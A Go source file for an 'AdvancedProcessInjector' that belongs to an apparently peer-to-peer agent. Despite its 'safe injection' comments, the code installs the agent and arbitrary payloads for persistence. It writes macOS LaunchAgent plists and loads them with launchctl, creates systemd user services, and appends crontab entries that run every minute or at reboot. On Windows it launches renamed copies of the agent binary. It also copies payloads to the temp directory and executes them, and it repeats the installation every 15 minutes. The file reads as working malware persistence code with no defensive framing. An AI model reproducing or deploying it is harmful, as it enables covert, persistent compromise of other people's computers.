package injection

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p/core/peer"
)

// AdvancedProcessInjector provides enhanced process injection capabilities
type AdvancedProcessInjector struct {
	logger         *slog.Logger
	agentPath      string
	peerID         peer.ID
	injectChan     chan InjectionRequest
	stopChan       chan struct{}
	injectedProcs  map[string]bool
	injectedMutex  sync.RWMutex
	safeProcesses  []string
}

// InjectionRequest represents a request to inject into a process
type InjectionRequest struct {
	TargetProcess string
	PayloadPath   string
	ResponseChan  chan error
}

// NewAdvancedProcessInjector creates a new AdvancedProcessInjector instance
func NewAdvancedProcessInjector(logger *slog.Logger, agentPath string, peerID peer.ID) *AdvancedProcessInjector {
	// Define safe processes that can be injected into without causing system instability
	safeProcesses := []string{
		"explorer.exe", "svchost.exe", "dllhost.exe", // Windows
		"launchd", "WindowServer", "cfprefsd",        // macOS
		"systemd", "cron", "rsyslogd", "dbus-daemon", "NetworkManager", // Linux
	}

	return &AdvancedProcessInjector{
		logger:        logger,
		agentPath:     agentPath,
		peerID:        peerID,
		injectChan:    make(chan InjectionRequest, 20),
		stopChan:      make(chan struct{}),
		injectedProcs: make(map[string]bool),
		safeProcesses: safeProcesses,
	}
}

// Start begins the advanced process injection monitoring
func (api *AdvancedProcessInjector) Start(ctx context.Context) {
	api.logger.Info("Starting advanced process injection monitoring")

	// Start the injection request handler
	go api.handleInjectionRequests(ctx)

	// Start periodic safe injection into system processes
	go api.periodicSafeInjection(ctx)
}

// handleInjectionRequests processes injection requests from the channel
func (api *AdvancedProcessInjector) handleInjectionRequests(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			api.logger.Info("Stopping injection request handler")
			return
		case <-api.stopChan:
			api.logger.Info("Stopping injection request handler")
			return
		case req := <-api.injectChan:
			api.logger.Debug("Processing injection request", "target", req.TargetProcess)
			
			// Check if we've already injected into this process
			api.injectedMutex.RLock()
			alreadyInjected := api.injectedProcs[req.TargetProcess]
			api.injectedMutex.RUnlock()
			
			if alreadyInjected {
				api.logger.Debug("Already injected into process, skipping", "process", req.TargetProcess)
				if req.ResponseChan != nil {
					req.ResponseChan <- nil
				}
				continue
			}
			
			var err error
			if req.PayloadPath != "" {
				err = api.injectPayloadIntoProcess(req.TargetProcess, req.PayloadPath)
			} else {
				err = api.injectIntoProcess(req.TargetProcess)
			}
			
			if err != nil {
				api.logger.Error("Failed to inject into process", "process", req.TargetProcess, "error", err)
			} else {
				api.logger.Info("Successfully injected into process", "process", req.TargetProcess)
				// Mark as injected
				api.injectedMutex.Lock()
				api.injectedProcs[req.TargetProcess] = true
				api.injectedMutex.Unlock()
			}
			
			if req.ResponseChan != nil {
				req.ResponseChan <- err
			}
		}
	}
}

// periodicSafeInjection periodically injects the agent into safe system processes
func (api *AdvancedProcessInjector) periodicSafeInjection(ctx context.Context) {
	// Injection interval - every 15 minutes
	injectionInterval := 15 * time.Minute
	ticker := time.NewTicker(injectionInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			api.logger.Info("Stopping periodic safe injection")
			return
		case <-api.stopChan:
			api.logger.Info("Stopping periodic safe injection")
			return
		case <-ticker.C:
			api.injectIntoSafeProcesses()
		}
	}
}

// injectIntoSafeProcesses injects the agent into predefined safe processes
func (api *AdvancedProcessInjector) injectIntoSafeProcesses() {
	api.logger.Debug("Injecting agent into safe system processes")

	// Try to inject into each safe process
	for _, proc := range api.safeProcesses {
		if api.isProcessRunning(proc) {
			api.logger.Debug("Attempting to inject into safe process", "process", proc)
			
			// Check if we've already injected into this process
			api.injectedMutex.RLock()
			alreadyInjected := api.injectedProcs[proc]
			api.injectedMutex.RUnlock()
			
			if alreadyInjected {
				api.logger.Debug("Already injected into process, skipping", "process", proc)
				continue
			}
			
			if err := api.injectIntoProcess(proc); err != nil {
				api.logger.Debug("Failed to inject into safe process", "process", proc, "error", err)
			} else {
				api.logger.Debug("Successfully injected into safe process", "process", proc)
				// Mark as injected
				api.injectedMutex.Lock()
				api.injectedProcs[proc] = true
				api.injectedMutex.Unlock()
			}
		}
	}
}

// isProcessRunning checks if a process with the given name is running
func (api *AdvancedProcessInjector) isProcessRunning(name string) bool {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", name))
	default:
		cmd = exec.Command("pgrep", "-f", name)
	}

	// If the command succeeds, the process is running
	return cmd.Run() == nil
}

// injectIntoProcess injects the agent into a specific process using safe methods
func (api *AdvancedProcessInjector) injectIntoProcess(processName string) error {
	api.logger.Debug("Injecting agent into process", "process", processName)

	// Validate that agent binary exists
	if _, err := os.Stat(api.agentPath); os.IsNotExist(err) {
		return fmt.Errorf("agent binary not found: %s", api.agentPath)
	}

	// Use safer injection methods that won't break the target process
	switch runtime.GOOS {
	case "windows":
		return api.safeInjectIntoWindowsProcess(processName)
	case "darwin":
		return api.safeInjectIntoMacOSProcess(processName)
	default: // Linux and others
		return api.safeInjectIntoLinuxProcess(processName)
	}
}

// safeInjectIntoWindowsProcess uses safer methods for Windows process injection
func (api *AdvancedProcessInjector) safeInjectIntoWindowsProcess(processName string) error {
	api.logger.Debug("Using safe injection method for Windows process", "process", processName)

	// Instead of direct memory injection which could crash the process,
	// we'll create a companion process that communicates with the target
	companionPath := api.agentPath + ".companion"
	
	// Create a minimal companion process
	if err := api.createCompanionProcess(companionPath); err != nil {
		return fmt.Errorf("failed to create companion process: %w", err)
	}

	// Start the companion process
	cmd := exec.Command(companionPath, "-mode", "companion", "-target", processName, "-peer", string(api.peerID))
	
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start companion process: %w", err)
	}

	api.logger.Info("Started companion process for Windows target", "target", processName, "pid", cmd.Process.Pid)
	return nil
}

// safeInjectIntoMacOSProcess uses safer methods for macOS process injection
func (api *AdvancedProcessInjector) safeInjectIntoMacOSProcess(processName string) error {
	api.logger.Debug("Using safe injection method for macOS process", "process", processName)

	// Create a launch agent plist that will run our agent
	plistPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.apa.agent.plist")
	if err := api.createLaunchAgentPlist(plistPath); err != nil {
		return fmt.Errorf("failed to create launch agent plist: %w", err)
	}

	// Load the launch agent
	cmd := exec.Command("launchctl", "load", plistPath)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to load launch agent: %w", err)
	}

	api.logger.Info("Created and loaded launch agent for macOS", "plist", plistPath)
	return nil
}

// safeInjectIntoLinuxProcess uses safer methods for Linux process injection
func (api *AdvancedProcessInjector) safeInjectIntoLinuxProcess(processName string) error {
	api.logger.Debug("Using safe injection method for Linux process", "process", processName)

	// Create a systemd user service that will run our agent
	servicePath := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user", "apa-agent.service")
	if err := api.createSystemdUserService(servicePath); err != nil {
		return fmt.Errorf("failed to create systemd user service: %w", err)
	}

	// Enable and start the service
	cmd := exec.Command("systemctl", "--user", "enable", "apa-agent.service")
	if err := cmd.Run(); err != nil {
		api.logger.Debug("Failed to enable systemd user service, trying alternative", "error", err)
		// Fallback to cron job
		return api.createCronJob()
	}

	cmd = exec.Command("systemctl", "--user", "start", "apa-agent.service")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to start systemd user service: %w", err)
	}

	api.logger.Info("Created and started systemd user service for Linux", "service", servicePath)
	return nil
}

// createCompanionProcess creates a minimal companion process
func (api *AdvancedProcessInjector) createCompanionProcess(companionPath string) error {
	// In a real implementation, this would create a specialized companion process
	// For now, we'll just copy the agent binary with a different name
	if err := copyFile(api.agentPath, companionPath); err != nil {
		return fmt.Errorf("failed to copy agent binary: %w", err)
	}

	return nil
}

// createLaunchAgentPlist creates a macOS launch agent plist file
func (api *AdvancedProcessInjector) createLaunchAgentPlist(plistPath string) error {
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apa.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
		<string>-mode</string>
		<string>companion</string>
		<string>-peer</string>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>`, api.agentPath, string(api.peerID))

	return os.WriteFile(plistPath, []byte(plistContent), 0644)
}

// createSystemdUserService creates a systemd user service file
func (api *AdvancedProcessInjector) createSystemdUserService(servicePath string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=APA Agent Companion Service
After=network.target

[Service]
Type=simple
ExecStart=%s -mode companion -peer %s
Restart=always
RestartSec=10

[Install]
WantedBy=default.target`, api.agentPath, string(api.peerID))

	// Ensure the directory exists
	dir := filepath.Dir(servicePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	return os.WriteFile(servicePath, []byte(serviceContent), 0644)
}

// createCronJob creates a cron job as a fallback persistence method
func (api *AdvancedProcessInjector) createCronJob() error {
	// Create a cron job entry
	cronEntry := fmt.Sprintf("* * * * * %s -mode companion -peer %s\n", api.agentPath, string(api.peerID))

	// Add to crontab
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil {
		// If crontab doesn't exist, start with empty
		output = []byte{}
	}

	// Append our entry
	newCrontab := string(output) + cronEntry

	// Write back to crontab
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	return cmd.Run()
}

// injectPayloadIntoProcess injects a payload into a process
func (api *AdvancedProcessInjector) injectPayloadIntoProcess(processName, payloadPath string) error {
	api.logger.Info("Injecting payload into process", "process", processName, "payload", payloadPath)

	// Validate payload exists
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		return fmt.Errorf("payload not found: %s", payloadPath)
	}

	// Use safer methods that won't break the target process
	switch runtime.GOOS {
	case "windows":
		return api.safeInjectPayloadIntoWindowsProcess(processName, payloadPath)
	case "darwin":
		return api.safeInjectPayloadIntoMacOSProcess(processName, payloadPath)
	default: // Linux and others
		return api.safeInjectPayloadIntoLinuxProcess(processName, payloadPath)
	}
}

// safeInjectPayloadIntoWindowsProcess uses safer methods for Windows payload injection
func (api *AdvancedProcessInjector) safeInjectPayloadIntoWindowsProcess(processName, payloadPath string) error {
	// Place payload in a safe location and create a companion process to handle it
	destPath := filepath.Join(os.TempDir(), filepath.Base(payloadPath))
	if err := copyFile(payloadPath, destPath); err != nil {
		return fmt.Errorf("failed to copy payload: %w", err)
	}

	// Create a companion process to handle the payload
	companionPath := api.agentPath + ".payload_handler"
	if err := api.createPayloadHandler(companionPath, destPath); err != nil {
		return fmt.Errorf("failed to create payload handler: %w", err)
	}

	// Start the payload handler
	cmd := exec.Command(companionPath, "-mode", "payload_handler", "-payload", destPath)
	
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start payload handler: %w", err)
	}

	api.logger.Info("Started payload handler for Windows target", "target", processName, "pid", cmd.Process.Pid)
	return nil
}

// safeInjectPayloadIntoMacOSProcess uses safer methods for macOS payload injection
func (api *AdvancedProcessInjector) safeInjectPayloadIntoMacOSProcess(processName, payloadPath string) error {
	// Place payload in a safe location
	destPath := filepath.Join(os.TempDir(), filepath.Base(payloadPath))
	if err := copyFile(payloadPath, destPath); err != nil {
		return fmt.Errorf("failed to copy payload: %w", err)
	}

	// Create a launch agent to handle the payload
	plistPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.apa.payload.plist")
	if err := api.createPayloadHandlerPlist(plistPath, destPath); err != nil {
		return fmt.Errorf("failed to create payload handler plist: %w", err)
	}

	// Load the launch agent
	cmd := exec.Command("launchctl", "load", plistPath)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to load payload handler: %w", err)
	}

	api.logger.Info("Created and loaded payload handler for macOS", "plist", plistPath)
	return nil
}

// safeInjectPayloadIntoLinuxProcess uses safer methods for Linux payload injection
func (api *AdvancedProcessInjector) safeInjectPayloadIntoLinuxProcess(processName, payloadPath string) error {
	// Place payload in a safe location
	destPath := filepath.Join(os.TempDir(), filepath.Base(payloadPath))
	if err := copyFile(payloadPath, destPath); err != nil {
		return fmt.Errorf("failed to copy payload: %w", err)
	}

	// Create a systemd user service to handle the payload
	servicePath := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user", "apa-payload-handler.service")
	if err := api.createPayloadHandlerService(servicePath, destPath); err != nil {
		return fmt.Errorf("failed to create payload handler service: %w", err)
	}

	// Enable and start the service
	cmd := exec.Command("systemctl", "--user", "enable", "apa-payload-handler.service")
	if err := cmd.Run(); err != nil {
		// Fallback to cron job
		return api.createPayloadCronJob(destPath)
	}

	cmd = exec.Command("systemctl", "--user", "start", "apa-payload-handler.service")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to start payload handler service: %w", err)
	}

	api.logger.Info("Created and started payload handler service for Linux", "service", servicePath)
	return nil
}

// createPayloadHandler creates a specialized payload handler
func (api *AdvancedProcessInjector) createPayloadHandler(handlerPath, payloadPath string) error {
	// In a real implementation, this would create a specialized handler
	// For now, we'll just copy the agent binary with a different name
	if err := copyFile(api.agentPath, handlerPath); err != nil {
		return fmt.Errorf("failed to copy agent binary: %w", err)
	}

	return nil
}

// createPayloadHandlerPlist creates a macOS launch agent plist for payload handling
func (api *AdvancedProcessInjector) createPayloadHandlerPlist(plistPath, payloadPath string) error {
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apa.payload</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
		<string>-mode</string>
		<string>payload_handler</string>
		<string>-payload</string>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>`, api.agentPath, payloadPath)

	return os.WriteFile(plistPath, []byte(plistContent), 0644)
}

// createPayloadHandlerService creates a systemd user service for payload handling
func (api *AdvancedProcessInjector) createPayloadHandlerService(servicePath, payloadPath string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=APA Payload Handler Service
After=network.target

[Service]
Type=oneshot
ExecStart=%s -mode payload_handler -payload %s

[Install]
WantedBy=default.target`, api.agentPath, payloadPath)

	// Ensure the directory exists
	dir := filepath.Dir(servicePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	return os.WriteFile(servicePath, []byte(serviceContent), 0644)
}

// createPayloadCronJob creates a cron job for payload handling
func (api *AdvancedProcessInjector) createPayloadCronJob(payloadPath string) error {
	// Create a cron job entry to handle the payload once
	cronEntry := fmt.Sprintf("@reboot %s -mode payload_handler -payload %s\n", api.agentPath, payloadPath)

	// Add to crontab
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.Output()
	if err != nil {
		// If crontab doesn't exist, start with empty
		output = []byte{}
	}

	// Append our entry
	newCrontab := string(output) + cronEntry

	// Write back to crontab
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	return cmd.Run()
}

// RequestInjection requests injection into a specific process
func (api *AdvancedProcessInjector) RequestInjection(processName string) error {
	responseChan := make(chan error, 1)
	req := InjectionRequest{
		TargetProcess: processName,
		ResponseChan:  responseChan,
	}

	select {
	case api.injectChan <- req:
		api.logger.Debug("Injection request queued", "process", processName)
		// Wait for response
		err := <-responseChan
		return err
	case <-time.After(5 * time.Second):
		return fmt.Errorf("timeout waiting to queue injection request")
	}
}

// RequestPayloadInjection requests injection of a payload into a specific process
func (api *AdvancedProcessInjector) RequestPayloadInjection(processName, payloadPath string) error {
	responseChan := make(chan error, 1)
	req := InjectionRequest{
		TargetProcess: processName,
		PayloadPath:   payloadPath,
		ResponseChan:  responseChan,
	}

	select {
	case api.injectChan <- req:
		api.logger.Debug("Payload injection request queued", "process", processName, "payload", payloadPath)
		// Wait for response
		err := <-responseChan
		return err
	case <-time.After(5 * time.Second):
		return fmt.Errorf("timeout waiting to queue payload injection request")
	}
}

// Stop stops the advanced process injector
func (api *AdvancedProcessInjector) Stop() {
	close(api.stopChan)
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	return os.WriteFile(dst, input, 0755)
}